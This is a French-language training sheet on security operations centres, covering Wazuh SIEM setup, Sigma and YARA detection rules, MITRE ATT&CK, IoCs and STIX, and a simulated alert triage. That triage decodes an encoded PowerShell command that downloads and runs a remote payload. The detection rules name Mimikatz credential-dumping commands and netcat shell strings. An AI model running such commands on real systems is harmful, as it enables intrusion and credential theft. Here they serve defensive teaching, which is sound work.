---
tags:
  - Cybersécurité
  - Intermédiaire
  - Concept
description: "Architecture SOC, SIEM, règles de détection Sigma/YARA, threat intelligence, triage d'alertes"
estimated_time: "85 min"
fiche_number: 4
total_fiches: 4
cursus: "Phase 3 - Compétences intermédiaires"
---

# 04 - Introduction au SOC et Monitoring

> **En bref** : À la fin de cette fiche, tu sauras expliquer l'architecture et le fonctionnement d'un SOC, déployer et utiliser un SIEM (Wazuh), écrire des règles de détection (Sigma et YARA), comprendre les concepts de threat intelligence (MITRE ATT&CK, IoC, STIX/TAXII), et effectuer un triage d'alertes en suivant le processus SOC L1/L2/L3. Lecture estimée : 85 min.


## Prérequis

- [Phase 3, fiche 01 - Sécurité des systèmes d'exploitation](01-securite-systemes-exploitation.md) (hardening Linux/Windows, Sysmon, logs système)
- [Phase 3, fiche 02 - Sécurité Web et Applicative](02-securite-web-applicative.md) (OWASP Top 10, attaques web courantes)
- [Phase 3, fiche 03 - Analyse de vulnérabilités et Reconnaissance](03-analyse-vulnerabilites.md) (Nmap, CVSS, énumération)
- Connaissances de base en réseau (TCP/IP, ports, protocoles)
- Connaissances de base en systèmes d'exploitation (logs Linux et Windows)

## Objectif de cette fiche

À la fin de cette fiche, tu sauras expliquer l'architecture et le fonctionnement d'un SOC, déployer et utiliser un SIEM (Wazuh), écrire des règles de détection (Sigma et YARA), comprendre les concepts de threat intelligence (MITRE ATT&CK, IoC, STIX/TAXII), et effectuer un triage d'alertes en suivant le processus SOC L1/L2/L3.

---

## Concepts

Cette section explique tous les concepts nécessaires. Lis-la entièrement avant de passer aux étapes pratiques.

### Qu'est-ce qu'un SOC ?

**Définition** : Un SOC (Security Operations Center) est une équipe et un ensemble de processus dédiés à la surveillance, la détection, l'analyse et la réponse aux incidents de sécurité informatique, 24 heures sur 24, 7 jours sur 7.

**Le problème que le SOC résout** :

Sans SOC, voici les problèmes rencontrés :

1. **Pas de surveillance continue** : les attaques peuvent se produire à toute heure. Sans surveillance permanente, une intrusion peut rester non détectée pendant des semaines ou des mois
2. **Alertes ignorées** : les outils de sécurité génèrent des milliers d'alertes par jour. Sans équipe dédiée pour les analyser, les alertes critiques sont noyées dans le bruit
3. **Réponse désorganisée** : sans processus défini, la réponse à un incident est chaotique. Qui fait quoi ? Comment communiquer ? Quand escalader ?

**Comment le SOC résout ces problèmes** :

| Problème | Solution apportée par le SOC |
| --- | --- |
| Pas de surveillance continue | Le SOC fonctionne en 24/7 avec des analystes qui surveillent les alertes en temps réel |
| Alertes ignorées | Les analystes trient, qualifient et priorisent chaque alerte selon des processus définis |
| Réponse désorganisée | Des procédures documentées (playbooks) définissent les actions à effectuer pour chaque type d'incident |

**Analogie concrète** : Le SOC, c'est comme le centre de surveillance d'un aéroport. Des opérateurs surveillent en permanence les écrans de contrôle (caméras, radars, détecteurs). Quand une anomalie est détectée (objet suspect, personne dans une zone interdite), un opérateur évalue la situation. Si c'est grave, il appelle la sécurité. Si c'est critique, il déclenche l'évacuation. Chaque procédure est documentée et répétée.

**Ce qu'un SOC n'est PAS** :

- Un SOC n'est pas un NOC (Network Operations Center). Le NOC surveille la disponibilité et la performance du réseau (pannes, latence). Le SOC surveille la sécurité (intrusions, malwares, fuites de données).
- Un SOC n'est pas un simple outil. C'est une combinaison de personnes, de processus et de technologies. L'outil (SIEM) sans l'équipe d'analystes est inutile.

### Qu'est-ce que les niveaux SOC (L1/L2/L3) ?

**Définition** : Les analystes SOC sont organisés en trois niveaux de compétence et de responsabilité, chacun avec un rôle précis dans le processus de détection et de réponse.

| Niveau | Rôle | Compétences | Actions typiques |
| --- | --- | --- | --- |
| L1 - Triage | Analyste de premier niveau | Analyse basique des alertes, utilisation du SIEM | Qualifier les alertes (vrai/faux positif), appliquer les playbooks, escalader au L2 |
| L2 - Investigation | Analyste confirmé | Analyse approfondie, corrélation, forensique de base | Investiguer les incidents escaladés, analyser les IoC, contenir les menaces |
| L3 - Expert | Ingénieur sécurité / Threat hunter | Threat hunting, reverse engineering, forensique avancée | Créer des règles de détection, mener des investigations complexes, améliorer les processus |

**Le processus de triage L1** :

1. Une alerte apparaît dans le SIEM
2. L'analyste L1 vérifie si c'est un faux positif (alert fatigue)
3. Si l'alerte est légitime, il collecte les informations de contexte (IP source, utilisateur, timestamp)
4. Il applique le playbook correspondant au type d'alerte
5. Si l'incident dépasse ses compétences, il escalade au L2 avec un résumé

### Qu'est-ce qu'un SIEM ?

**Définition** : Un SIEM (Security Information and Event Management) est un système centralisé qui collecte, agrège, corrèle et analyse les logs de sécurité provenant de toutes les sources de l'infrastructure (serveurs, pare-feux, applications, endpoints) pour détecter les menaces et les incidents.

**Le problème que le SIEM résout** :

Sans SIEM, voici les problèmes rencontrés :

1. **Logs dispersés** : chaque serveur, pare-feu et application stocke ses logs localement. Chercher une information nécessite de se connecter à chaque système individuellement
2. **Pas de corrélation** : un seul événement (ex : une connexion SSH échouée) n'est pas suspect. Mais 500 tentatives en 5 minutes depuis la même IP indiquent une attaque par brute force. Sans corrélation, ce pattern est invisible
3. **Pas de rétention centralisée** : si un attaquant compromet un serveur, il peut effacer les logs locaux pour couvrir ses traces

**Comment le SIEM résout ces problèmes** :

| Problème | Solution apportée par le SIEM |
| --- | --- |
| Logs dispersés | Collecte centralisée de tous les logs dans une base de données unique et interrogeable |
| Pas de corrélation | Moteur de corrélation qui détecte les patterns d'attaque en croisant les événements de sources multiples |
| Pas de rétention centralisée | Stockage sécurisé et centralisé avec rétention configurable (90 jours, 1 an, etc.) |

**Analogie concrète** : Le SIEM, c'est comme le tableau de bord d'un médecin urgentiste. Au lieu de consulter séparément le cardiogramme, la pression artérielle, la température et les analyses sanguines, le tableau de bord affiche tout au même endroit. Si la fréquence cardiaque augmente ET que la pression chute ET que la température monte, le système alerte le médecin : c'est un pattern de choc septique. Aucun de ces signaux pris isolément ne serait alarmant.

Le diagramme suivant illustre le flux d'une alerte dans un SOC, depuis la collecte des logs jusqu'a la réponse incident :

<div class="diagram-design">
<p><a href="../../../diagrams/cybersecurite-03-competences-intermediaires-04-introduction-soc-monitoring-1.html">Qu&#x27;est-ce qu&#x27;un SIEM ? (HTML + SVG)</a></p>
<iframe src="../../../diagrams/cybersecurite-03-competences-intermediaires-04-introduction-soc-monitoring-1.html" title="Qu&#x27;est-ce qu&#x27;un SIEM ?" style="width:100%;min-height:700px;border:0;background:transparent"></iframe>
</div>

**Comparaison des principaux SIEM** :

| SIEM | Licence | Forces | Faiblesses |
| --- | --- | --- | --- |
| Wazuh | Open source (gratuit) | Agent endpoint intégré, conformité, léger | Interface moins ergonomique |
| ELK/OpenSearch | Open source (gratuit) | Puissant, flexible, grande communauté | Pas de règles de détection intégrées, nécessite beaucoup de configuration |
| Splunk | Commercial (très cher) | Leader du marché, SPL puissant, écosystème riche | Coût élevé (licence par volume de données ingérées) |
| Microsoft Sentinel | Cloud (pay-as-you-go) | Intégration native Azure/M365, IA | Dépendance au cloud Microsoft |

### Qu'est-ce que Wazuh ?

**Définition** : Wazuh est une plateforme de sécurité open source qui combine les fonctions de SIEM, de détection d'intrusion (HIDS), de monitoring d'intégrité des fichiers (FIM), de détection de vulnérabilités et de conformité réglementaire. C'est l'un des SIEM open source les plus complets.

**Architecture de Wazuh** :

```text
┌──────────────┐   ┌──────────────┐   ┌──────────────┐
│  Agent Linux │   │ Agent Windows│   │  Agent macOS │
│  (endpoint)  │   │  (endpoint)  │   │  (endpoint)  │
└──────┬───────┘   └──────┬───────┘   └──────┬───────┘
       │                  │                   │
       └──────────────────┼───────────────────┘
                          │
                   ┌──────▼───────┐
                   │  Wazuh       │
                   │  Manager     │  Analyse, corrélation, alertes
                   └──────┬───────┘
                          │
                   ┌──────▼───────┐
                   │  Wazuh       │
                   │  Indexer     │  Stockage et recherche (OpenSearch)
                   └──────┬───────┘
                          │
                   ┌──────▼───────┐
                   │  Wazuh       │
                   │  Dashboard   │  Interface web de visualisation
                   └──────────────┘
```

### Qu'est-ce que la collecte de logs ?

**Définition** : La collecte de logs est le processus de transfert des journaux d'événements depuis les sources (serveurs, pare-feux, applications) vers le SIEM centralisé. Les principaux mécanismes sont syslog, les agents déployés sur les endpoints, et le Windows Event Forwarding (WEF).

**Mécanismes de collecte** :

| Mécanisme | Description | Cas d'usage |
| --- | --- | --- |
| Syslog (UDP/TCP 514) | Protocole standard de journalisation Unix/Linux. Chaque événement est envoyé au serveur syslog central. | Équipements réseau (routeurs, switches, pare-feux), serveurs Linux |
| Agents (Wazuh, Elastic) | Logiciel installé sur chaque endpoint qui collecte les logs et les envoie au serveur central de manière sécurisée. | Serveurs et postes de travail (Linux, Windows, macOS) |
| Windows Event Forwarding | Mécanisme natif Windows qui transfère les événements du journal Windows vers un collecteur central. | Environnements Windows avec Active Directory |
| API / Webhook | Collecte des logs d'applications SaaS et cloud via des API REST. | Applications cloud (M365, AWS CloudTrail, Google Workspace) |

### Qu'est-ce que les règles Sigma ?

**Définition** : Sigma est un format standard et ouvert pour écrire des règles de détection de menaces. Une règle Sigma est indépendante du SIEM : elle peut être convertie automatiquement en requêtes pour Splunk, Elastic, Wazuh, QRadar ou tout autre SIEM.

**Le problème que Sigma résout** :

Sans Sigma, voici les problèmes rencontrés :

1. **Verrouillage par le SIEM** : chaque SIEM a son propre langage de requête (SPL pour Splunk, KQL pour Sentinel, Lucene pour Elastic). Les règles écrites pour un SIEM ne fonctionnent pas sur un autre.
2. **Partage difficile** : les équipes de sécurité ne peuvent pas partager leurs règles de détection avec la communauté si elles sont écrites dans un format propriétaire.
3. **Pas de standard** : sans format commun, chaque analyste écrit ses règles différemment.

**Comment Sigma résout ces problèmes** :

| Problème | Solution apportée par Sigma |
| --- | --- |
| Verrouillage par le SIEM | Format indépendant du SIEM, convertible automatiquement via le compilateur `sigma-cli` |
| Partage difficile | Dépôt communautaire (SigmaHQ) avec des milliers de règles partagées par la communauté |
| Pas de standard | Format YAML standardisé avec des champs obligatoires (title, logsource, détection) |

**Analogie concrète** : Sigma, c'est comme le format PDF pour les documents. Au lieu d'envoyer un fichier .docx (Word uniquement) ou .pages (Apple uniquement), tu envoies un PDF qui est lisible sur tous les systèmes. Sigma est le "PDF des règles de détection" : tu écris une seule fois, et tu convertis pour n'importe quel SIEM.

### Qu'est-ce que YARA ?

**Définition** : YARA est un outil de classification et d'identification de malwares basé sur des règles textuelles. Une règle YARA définit des patterns (chaînes de caractères, séquences d'octets, expressions régulières) qui identifient un fichier malveillant.

**Le problème que YARA résout** :

Sans YARA, voici les problèmes rencontrés :

1. **Détection par signature limitée** : les antivirus classiques utilisent des hashes de fichiers pour détecter les malwares. Si l'attaquant modifie un seul octet, le hash change et le malware n'est plus détecté.
2. **Analyse manuelle fastidieuse** : analyser manuellement chaque fichier suspect pour identifier s'il est malveillant prend un temps considérable.

**Comment YARA résout ces problèmes** :

| Problème | Solution apportée par YARA |
| --- | --- |
| Détection par signature limitée | YARA détecte des patterns (chaînes, structures) plutôt que des hashes. Un malware modifié conserve dans la majorité des cas les mêmes patterns caractéristiques. |
| Analyse manuelle fastidieuse | YARA automatise la classification : tu définis les critères une fois, et l'outil scanne des milliers de fichiers en quelques secondes. |

**Comparaison Sigma vs YARA** :

| Sigma | YARA |
| --- | --- |
| Détection dans les logs (événements) | Détection dans les fichiers (binaires, documents) |
| Format de règles pour SIEM | Format de règles pour analyse de fichiers |
| Basé sur des champs de log (EventID, CommandLine) | Basé sur des patterns de contenu (chaînes, octets) |
| Utilisé par les analystes SOC | Utilisé par les analystes malware et les threat hunters |

### Qu'est-ce que MITRE ATT&CK ?

**Définition** : MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) est une base de connaissances publique qui catalogue les tactiques et techniques utilisées par les attaquants dans le monde réel. Elle est organisée en 14 tactiques (les objectifs de l'attaquant) et des centaines de techniques (les méthodes pour atteindre ces objectifs).

**Le problème que MITRE ATT&CK résout** :

Sans MITRE ATT&CK, voici les problèmes rencontrés :

1. **Pas de vocabulaire commun** : chaque analyste décrit les attaques avec ses propres termes. "Mouvement latéral", "pivoting", "propagation" peuvent désigner la même chose.
2. **Couverture de détection inconnue** : impossible de savoir quelles techniques d'attaque sont détectées par les règles en place et lesquelles ne le sont pas.
3. **Threat intelligence fragmentée** : les rapports de différents éditeurs utilisent des terminologies différentes pour décrire les mêmes groupes d'attaquants.

**Comment MITRE ATT&CK résout ces problèmes** :

| Problème | Solution apportée par MITRE ATT&CK |
| --- | --- |
| Pas de vocabulaire commun | Chaque technique a un identifiant unique (ex: T1059.001 = PowerShell) utilisé mondialement |
| Couverture inconnue | La matrice ATT&CK permet de visualiser quelles techniques sont couvertes par les détections en place |
| Threat intelligence fragmentée | Chaque groupe d'attaquants (APT) est documenté avec les techniques qu'il utilise |

**Les 14 tactiques MITRE ATT&CK** :

| # | Tactique | Description |
| --- | --- | --- |
| 1 | Reconnaissance | Collecte d'informations sur la cible |
| 2 | Resource Development | Préparation de l'infrastructure d'attaque |
| 3 | Initial Access | Point d'entrée initial (phishing, exploit) |
| 4 | Exécution | Exécution de code malveillant |
| 5 | Persistence | Maintien de l'accès après reboot |
| 6 | Privilege Escalation | Obtention de droits supérieurs |
| 7 | Defense Evasion | Contournement des défenses |
| 8 | Credential Access | Vol d'identifiants |
| 9 | Discovery | Exploration de l'environnement compromis |
| 10 | Lateral Movement | Déplacement vers d'autres machines |
| 11 | Collection | Collecte des données cibles |
| 12 | Command and Control | Communication avec le serveur de l'attaquant |
| 13 | Exfiltration | Extraction des données volées |
| 14 | Impact | Destruction, chiffrement, déni de service |

### Qu'est-ce que les IoC et STIX/TAXII ?

**Définition** : Les IoC (Indicators of Compromise) sont des artefacts observables qui indiquent qu'un système a été compromis. STIX (Structured Threat Information Expression) est un format standard pour décrire les menaces et les IoC. TAXII (Trusted Automated Exchange of Indicator Information) est un protocole pour échanger automatiquement des données STIX entre organisations.

**Exemples d'IoC** :

| Type d'IoC | Exemple | Ce qu'il indique |
| --- | --- | --- |
| Hash de fichier (MD5/SHA256) | `d41d8cd98f00b204e9800998ecf8427e` | Présence d'un fichier malveillant connu |
| Adresse IP | `185.220.101.34` | Communication avec un serveur C2 (Command & Control) |
| Nom de domaine | `evil-update.example.com` | Résolution DNS vers un domaine malveillant |
| URL | `http://evil.com/payload.exe` | Téléchargement d'un malware |
| Clé de registre | `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\update` | Mécanisme de persistance |
| Mutex | `Global\MyMalwareMutex` | Indicateur spécifique d'un malware |

---

## Étapes Pratiques

### Étape 1 : Installer Wazuh (SIEM open source)

```bash
# Installer Wazuh All-in-One avec Docker Compose
# Prérequis : Docker et Docker Compose installés

# Cloner le dépôt Wazuh Docker
git clone https://github.com/wazuh/wazuh-docker.git -b v4.9.0
cd wazuh-docker/single-node

# Générer les certificats SSL
docker compose -f generate-indexer-certs.yml run --rm generator

# Démarrer Wazuh
docker compose up -d
```

**Résultat attendu** :

```text
[+] Running 4/4
 ✔ Network single-node_default      Created
 ✔ Container single-node-wazuh.indexer-1    Started
 ✔ Container single-node-wazuh.manager-1    Started
 ✔ Container single-node-wazuh.dashboard-1  Started
```

```bash
# Vérifier que tous les conteneurs sont en cours d'exécution
docker compose ps
```

**Résultat attendu** :

```text
NAME                                STATUS          PORTS
single-node-wazuh.dashboard-1      Up (healthy)    0.0.0.0:443->5601/tcp
single-node-wazuh.indexer-1        Up (healthy)    0.0.0.0:9200->9200/tcp
single-node-wazuh.manager-1        Up (healthy)    0.0.0.0:1514->1514/tcp, 0.0.0.0:55000->55000/tcp
```

```bash
# Accéder au tableau de bord Wazuh
# URL : https://localhost:443
# Login : admin
# Password : SecretPassword (défini dans docker-compose.yml)
```

---

### Étape 2 : Déployer un agent Wazuh sur un endpoint

```bash
# Installer l'agent Wazuh sur une machine Linux
# Remplacer WAZUH_MANAGER_IP par l'IP du serveur Wazuh

curl -so wazuh-agent.deb https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.9.0-1_amd64.deb
sudo WAZUH_MANAGER='WAZUH_MANAGER_IP' dpkg -i wazuh-agent.deb
sudo systemctl daemon-reload
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

**Résultat attendu** :

```text
# Vérifier le statut de l'agent
sudo systemctl status wazuh-agent
```

```text
● wazuh-agent.service - Wazuh agent
     Loaded: loaded (/lib/systemd/system/wazuh-agent.service; enabled)
     Active: active (running) since Thu 2026-03-19 16:00:00 CET
   Main PID: 12345 (wazuh-agentd)
     Status: "Connected to 192.168.1.50"
```

```bash
# Sur Windows, installer l'agent via PowerShell (en administrateur)
# Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.9.0-1.msi -OutFile wazuh-agent.msi
# msiexec.exe /i wazuh-agent.msi /q WAZUH_MANAGER="WAZUH_MANAGER_IP"
# net start WazuhSvc
```

---

### Étape 3 : Configurer la collecte de logs syslog

```bash
# Configurer rsyslog pour envoyer les logs au serveur Wazuh
# Éditer /etc/rsyslog.conf ou créer /etc/rsyslog.d/wazuh.conf

sudo tee /etc/rsyslog.d/wazuh.conf << 'EOF'
# Envoyer tous les logs au serveur Wazuh via syslog TCP
*.* @@WAZUH_MANAGER_IP:514
EOF

# Redémarrer rsyslog
sudo systemctl restart rsyslog

# Vérifier que les logs sont envoyés
logger "Test syslog vers Wazuh"
```

```bash
# Sur le serveur Wazuh, configurer la réception syslog
# Éditer /var/ossec/etc/ossec.conf (dans le conteneur Docker)
# docker exec -it single-node-wazuh.manager-1 bash

# Ajouter dans la section <ossec_config> :
# <remote>
#   <connection>syslog</connection>
#   <port>514</port>
#   <protocol>tcp</protocol>
#   <allowed-ips>192.168.1.0/24</allowed-ips>
# </remote>
```

---

### Étape 4 : Écrire une règle Sigma

```yaml
# Fichier : detect-mimikatz.yml
# Règle Sigma pour détecter l'exécution de Mimikatz

title: Mimikatz Execution Detected
id: a6b89c12-3456-7890-abcd-ef1234567890
status: test
description: Detects execution of Mimikatz tool used for credential dumping
references:
    - https://attack.mitre.org/techniques/T1003/001/
author: SOC Team
date: 2026/03/19
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_image:
        Image|endswith:
            - '\mimikatz.exe'
            - '\mimilib.dll'
    selection_cmdline:
        CommandLine|contains:
            - 'sekurlsa::logonpasswords'
            - 'lsadump::sam'
            - 'lsadump::dcsync'
            - 'token::elevate'
    selection_original_name:
        OriginalFileName: 'mimikatz.exe'
    condition: selection_image or selection_cmdline or selection_original_name
falsepositives:
    - Legitimate penetration testing
level: critical
```

```bash
# Installer sigma-cli pour convertir les règles
pip3 install sigma-cli

# Convertir la règle Sigma en format Wazuh
sigma convert -t wazuh -p sysmon detect-mimikatz.yml

# Convertir en format Splunk SPL
sigma convert -t splunk detect-mimikatz.yml

# Convertir en format Elastic/OpenSearch
sigma convert -t opensearch detect-mimikatz.yml
```

**Résultat attendu** (conversion Splunk) :

```text
source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=1) AND
((Image="*\\mimikatz.exe" OR Image="*\\mimilib.dll") OR
(CommandLine="*sekurlsa::logonpasswords*" OR CommandLine="*lsadump::sam*" OR
CommandLine="*lsadump::dcsync*" OR CommandLine="*token::elevate*") OR
(OriginalFileName="mimikatz.exe"))
```

---

### Étape 5 : Écrire une règle YARA

```bash
# Installer YARA
sudo apt install yara    # Debian/Ubuntu

# Créer une règle YARA pour détecter un outil de hacking
# Fichier : detect-netcat.yar
```

```text
rule Detect_Netcat {
    meta:
        description = "Detects netcat or ncat binary"
        author = "SOC Team"
        date = "2026-03-19"
        severity = "medium"

    strings:
        $s1 = "netcat" ascii nocase
        $s2 = "nc -e" ascii
        $s3 = "nc.exe" ascii nocase
        $s4 = "ncat" ascii nocase
        $s5 = { 6E 63 20 2D 6C 20 2D 70 }
        $s6 = "connect to somewhere" ascii
        $s7 = "listen for inbound" ascii

    condition:
        uint16(0) == 0x457F and
        filesize < 5MB and
        3 of ($s*)
}
```

```bash
# Scanner un fichier avec la règle YARA
yara detect-netcat.yar /usr/bin/nc
```

**Résultat attendu** :

```text
Detect_Netcat /usr/bin/nc
```

```bash
# Scanner un répertoire entier
yara -r detect-netcat.yar /tmp/suspicious/

# Scanner avec plusieurs règles
yara -r rules/ /tmp/suspicious/
```

---

### Étape 6 : Explorer MITRE ATT&CK

```bash
# Accéder à la matrice ATT&CK : https://attack.mitre.org/matrices/enterprise/

# Utiliser l'outil ATT&CK Navigator pour visualiser la couverture de détection
# URL : https://mitre-attack.github.io/attack-navigator/

# Exemple : mapper les règles de détection sur la matrice
# 1. Ouvrir ATT&CK Navigator
# 2. Créer une nouvelle couche (layer)
# 3. Pour chaque règle Sigma/Wazuh, colorier la technique correspondante

# En ligne de commande, utiliser pyattck pour interroger ATT&CK
pip3 install pyattck
```

```python
# Script Python pour lister les techniques d'un groupe APT
# Fichier : query-attack.py

from pyattck import Attck

attack = Attck()

# Lister les techniques du groupe APT29 (Cozy Bear)
for actor in attack.enterprise.actors:
    if 'APT29' in actor.name:
        print(f"Groupe : {actor.name}")
        print(f"Description : {actor.description[:200]}...")
        print(f"\nTechniques utilisées :")
        for technique in actor.techniques:
            print(f"  - {technique.id}: {technique.name}")
```

---

### Étape 7 : Triage d'une alerte SOC (simulation L1)

Cette étape simule le processus de triage d'une alerte dans un SOC.

```text
## Alerte reçue dans le SIEM

Timestamp: 2026-03-19 02:34:17 UTC
Rule: Suspicious PowerShell Execution
Severity: High
Source: SIEM - Wazuh
Agent: DESKTOP-FINANCE01 (192.168.10.42)

Event Details:
  EventID: 1 (Sysmon - Process Create)
  User: CORP\jean.dupont
  ParentImage: C:\Windows\explorer.exe
  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMwA0AC8AcABhAHkAbABvAGEAZAAnACkA
```

```bash
# Étape 1 : Décoder la commande PowerShell encodée en base64
# PowerShell encode en UTF-16LE, il faut convertir en UTF-8 après le décodage
BASE64="SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
BASE64+="LgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIA"
BASE64+="MAAuADEAMAAxAC4AMwA0AC8AcABhAHkAbABvAGEAZAAnACkA"
echo "$BASE64" | base64 -d | iconv -f UTF-16LE -t UTF-8
```

**Résultat attendu** :

```text
IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.34/payload')
```

```bash
# Étape 2 : Analyser la commande décodée
# IEX = Invoke-Expression : exécute du code téléchargé depuis Internet
# DownloadString : télécharge le contenu d'une URL
# URL : http://185.220.101.34/payload
# VERDICT : Commande malveillante - téléchargement et exécution de code distant

# Étape 3 : Vérifier l'IP sur les bases de threat intelligence
# VirusTotal : https://www.virustotal.com/gui/ip-address/185.220.101.34
# AbuseIPDB : https://www.abuseipdb.com/check/185.220.101.34
# Shodan : shodan host 185.220.101.34

# Étape 4 : Chercher d'autres événements liés dans le SIEM
# - Connexions réseau vers 185.220.101.34 depuis d'autres machines
# - Autres commandes PowerShell suspectes sur DESKTOP-FINANCE01
# - Événements de connexion inhabituels pour jean.dupont

# Étape 5 : Documenter et escalader au L2
```

```text
## Fiche de triage L1

**Alerte** : Suspicious PowerShell Execution
**Date/Heure** : 2026-03-19 02:34:17 UTC
**Machine** : DESKTOP-FINANCE01 (192.168.10.42)
**Utilisateur** : CORP\jean.dupont

**Analyse** :
- Commande PowerShell encodée en base64
- Décodée : IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.34/payload')
- Cette commande télécharge et exécute du code distant
- L'IP 185.220.101.34 est connue comme nœud Tor/malveillante (VirusTotal: 15/87 détections)
- L'heure (02h34) est inhabituelle pour cet utilisateur

**Classification** : Vrai positif - Incident confirmé
**Sévérité** : Haute
**Tactique MITRE ATT&CK** : Execution (T1059.001 - PowerShell)
**Action** : Escalade au L2 pour investigation approfondie et confinement
```

---

### Étape 8 : Créer un dashboard de monitoring dans Wazuh

```bash
# Dans le dashboard Wazuh (https://localhost:443) :

# 1. Aller dans Modules > Security Events
# 2. Observer les alertes en temps réel

# Les métriques clés à surveiller :
# - Nombre d'alertes par sévérité (Critical, High, Medium, Low)
# - Top 10 des règles déclenchées
# - Top 10 des agents avec le plus d'alertes
# - Alertes par tactique MITRE ATT&CK
# - Événements d'authentification échouée

# 3. Créer un dashboard personnalisé :
# Aller dans OpenSearch Dashboards > Dashboard > Create new
# Ajouter des visualisations :
# - Pie chart : alertes par sévérité
# - Bar chart : top 10 règles déclenchées
# - Line chart : évolution des alertes dans le temps
# - Table : dernières alertes critiques
```

---

### Étape 9 : Configurer une règle de détection dans Wazuh

```bash
# Les règles Wazuh sont au format XML
# Elles sont stockées dans /var/ossec/etc/rules/local_rules.xml

# Créer une règle pour détecter un brute force SSH
# Éditer le fichier dans le conteneur Docker :
# docker exec -it single-node-wazuh.manager-1 bash
# vi /var/ossec/etc/rules/local_rules.xml
```

```xml
<!-- Règle de détection : brute force SSH -->
<!-- Se déclenche après 10 tentatives échouées en 120 secondes -->
<group name="local,sshd,authentication_failures,">

  <rule id="100001" level="10" frequency="10" timeframe="120">
    <if_matched_sid>5710</if_matched_sid>
    <description>Brute force SSH détecté : $(srcip) - plus de 10 tentatives échouées en 2 minutes</description>
    <mitre>
      <id>T1110.001</id>
    </mitre>
    <group>authentication_failures,brute_force,</group>
  </rule>

</group>
```

```bash
# Redémarrer le manager Wazuh pour appliquer la règle
# docker exec single-node-wazuh.manager-1 /var/ossec/bin/wazuh-control restart

# Tester la règle en simulant un brute force SSH
# Depuis une autre machine :
for i in $(seq 1 15); do
    ssh invaliduser@WAZUH_AGENT_IP 2>/dev/null
done
```

---

### Étape 10 : Utiliser des feeds de threat intelligence

```bash
# Wazuh intègre nativement des listes de CDB (Constant Database)
# pour bloquer les IP malveillantes

# Télécharger une liste d'IP malveillantes
curl -s https://rules.emergingthreats.net/blockrules/compromised-ips.txt \
  | grep -v "^#" > /tmp/malicious-ips.txt

# Convertir en format CDB Wazuh
# Chaque ligne : IP:description
# Copier dans le conteneur :
# docker cp /tmp/malicious-ips.txt single-node-wazuh.manager-1:/var/ossec/etc/lists/
```

```bash
# Format STIX/TAXII pour l'échange automatisé
# Exemple de structure STIX 2.1 (JSON)
```

```json
{
  "type": "indicator",
  "spec_version": "2.1",
  "id": "indicator--a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "created": "2026-03-19T10:00:00.000Z",
  "modified": "2026-03-19T10:00:00.000Z",
  "name": "Malicious IP - C2 Server",
  "description": "Command and Control server used by APT group",
  "pattern": "[ipv4-addr:value = '185.220.101.34']",
  "pattern_type": "stix",
  "valid_from": "2026-03-19T10:00:00.000Z",
  "labels": ["malicious-activity"],
  "kill_chain_phases": [
    {
      "kill_chain_name": "mitre-attack",
      "phase_name": "command-and-control"
    }
  ]
}
```

---

## Commandes Utiles

| Commande | Action |
| --- | --- |
| `docker compose up -d` (dans wazuh-docker/) | Démarrer Wazuh |
| `docker compose ps` | Vérifier l'état des conteneurs Wazuh |
| `sudo systemctl status wazuh-agent` | Vérifier l'état de l'agent Wazuh |
| `sigma convert -t wazuh fichier.yml` | Convertir une règle Sigma en format Wazuh |
| `sigma convert -t splunk fichier.yml` | Convertir une règle Sigma en Splunk SPL |
| `yara regles.yar fichier` | Scanner un fichier avec une règle YARA |
| `yara -r regles/ repertoire/` | Scanner un répertoire récursivement avec YARA |
| `echo "base64" \| base64 -d` | Décoder du base64 (commandes PowerShell encodées) |
| `logger "message"` | Envoyer un message test dans syslog |

---

## Pièges Fréquents

### Piège 1 : Alert fatigue (fatigue des alertes)

**Problème** : Un SIEM mal configuré génère des milliers de faux positifs par jour. Les analystes finissent par ignorer les alertes, y compris les vraies menaces. C'est le piège numéro un des SOC.

**Solution** : Tuner les règles de détection progressivement. Commencer avec un petit nombre de règles à haute fidélité (peu de faux positifs), puis ajouter des règles graduellement. Créer des exceptions documentées pour les faux positifs connus. Mesurer le ratio vrai positif / faux positif de chaque règle.

### Piège 2 : Collecter trop de logs sans les analyser

**Problème** : Certaines organisations envoient tous les logs possibles au SIEM sans stratégie. Le volume de données explose, les coûts de stockage augmentent, et personne n'analyse réellement les données collectées.

**Solution** : Définir une stratégie de collecte basée sur les risques. Prioriser les logs les plus utiles pour la détection :

- Logs d'authentification (succès et échecs)
- Logs de création de processus (Sysmon Event ID 1)
- Logs de connexion réseau (Sysmon Event ID 3)
- Logs du pare-feu (connexions bloquées et autorisées)
- Logs des serveurs web (accès et erreurs)

### Piège 3 : Ne pas mapper les détections sur MITRE ATT&CK

**Problème** : Sans mapping MITRE ATT&CK, il est impossible de savoir quelles techniques d'attaque sont couvertes par les règles de détection. Des angles morts critiques passent inaperçus.

**Solution** : Pour chaque règle de détection, identifier la technique MITRE ATT&CK correspondante. Utiliser ATT&CK Navigator pour visualiser la couverture et identifier les lacunes. Prioriser la création de règles pour les techniques les plus utilisées par les attaquants.

### Piège 4 : Confondre IoC et TTP

**Problème** : Se concentrer uniquement sur les IoC (IP, hashes, domaines) donne une protection fragile. Les attaquants changent leurs IoC en quelques minutes (nouvelle IP, nouveau domaine, recompilation du malware).

